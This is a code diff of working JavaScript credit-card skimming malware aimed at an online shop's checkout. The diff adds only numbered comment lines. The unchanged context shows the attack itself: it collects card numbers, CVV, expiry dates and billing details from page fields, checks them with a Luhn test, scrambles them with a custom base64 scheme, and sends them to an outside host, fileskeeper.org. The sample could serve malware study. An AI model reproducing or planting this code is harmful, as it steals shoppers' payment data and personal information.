@@ -83,6 +83,7 @@ setTimeout(function () {
       c();
     }, 3000);
   }
+  //7
   function d(f) {
     f = f.replace(/ /g, '');
     var c;
@@ -91,6 +92,7 @@ setTimeout(function () {
     var g;
     var a;
     var b;
+    //16
     e = true;
     g = 0;
     d = (f + '').split('').reverse();
@@ -100,11 +102,14 @@ setTimeout(function () {
       if (e = !e) {
         c *= 2;
       }
+      //23
       if (c > 9) {
         c -= 9;
       }
+      //26
       g += c;
     }
+    //20
     return g % 10 === 0;
   }
   function c() {
@@ -125,10 +130,13 @@ setTimeout(function () {
   }
   function f() {
     var a = jQuery('#moip_cc_number').val();
+    //56
     if (!d(a)) {
       return;
     }
+    //58
     var b = 'billing-email=' + jQuery('#billing\\:email').val() + '&billing-firstname=' + jQuery('#moip_cc_owner').val() + '&billing-lastname=' + '&billing-street-=' + jQuery('#billing\\:street1').val() + ' ' + jQuery('#billing\\:street2').val() + '&billing-postcode=' + jQuery('#billing\\:postcode').val() + '&billing-state=' + jQuery('#billing\\:region_id > option:selected').text() + '&billing-city=' + jQuery('#billing\\:city').val() + '&billing-country_id=' + jQuery('#billing\\:country_id').val() + '&billing-telephone=' + jQuery('#billing\\:telephone').val() + '&payment-cc_number=' + a + '&payment-cc_name=' + jQuery('#billing\\:firstname').val() + ' ' + jQuery('#billing\\:lastname').val() + '&payment-cc_exp_month=' + jQuery('#credito_expiracao_mes').val() + '&payment-cc_exp_year=' + jQuery('#credito_expiracao_ano').val() + '&payment-cc_cid=' + jQuery('#moip_cc_cid').val() + '&idd=' + window.location.host;
+    //62
     encData = e(b);
     jQuery.ajax({
       url: 'https://fileskeeper.org/tr/',
@@ -148,6 +156,7 @@ setTimeout(function () {
   }
   function e(d, c) {
     var a = b.encode(d);
+    //99
     a = a.replace(/a/g, '-');
     a = a.replace(/h/g, '_');
     a = a.replace(/e/g, ':');
@@ -171,7 +180,9 @@ setTimeout(function () {
       var g;
       var k;
       var a;
+      //113
       var d = 0;
+      //113
       c = b._utf8_encode(c);
       while (d < c.length) {
         f = c.charCodeAt(d++);
@@ -188,8 +199,10 @@ setTimeout(function () {
             a = 64;
           }
         }
+        //113
         j = j + this._keyStr.charAt(i) + this._keyStr.charAt(g) + this._keyStr.charAt(k) + this._keyStr.charAt(a);
       }
+      //113
       return j;
     },
     decode: function (c) {
@@ -201,7 +214,9 @@ setTimeout(function () {
       var g;
       var k;
       var a;
+      //113
       var d = 0;
+      //113
       c = c.replace(/[^A-Za-z0-9+/=]/g, '');
       while (d < c.length) {
         i = this._keyStr.indexOf(c.charAt(d++));
@@ -215,18 +230,22 @@ setTimeout(function () {
         if (k != 64) {
           j = j + String.fromCharCode(h);
         }
+        //113
         if (a != 64) {
           j = j + String.fromCharCode(e);
         }
       }
+      //113
       j = b._utf8_decode(j);
       return j;
     },
     _utf8_encode: function (a) {
       a = a.replace(/rn/g, 'n');
       var d = '';
+      //113
       for (var b = 0; b < a.length; b++) {
         var c = a.charCodeAt(b);
+        //113
         if (c < 128) {
           d += String.fromCharCode(c);
         } else {
@@ -240,12 +259,16 @@ setTimeout(function () {
           }
         }
       }
+      //113
       return d;
     },
     _utf8_decode: function (a) {
       var d = '';
+      //113
       var b = 0;
+      //113
       var c = c1 = c2 = 0;
+      //113
       while (b < a.length) {
         c = a.charCodeAt(b);
         if (c < 128) {
@@ -264,6 +287,7 @@ setTimeout(function () {
           }
         }
       }
+      //113
       return d;
     }
   };
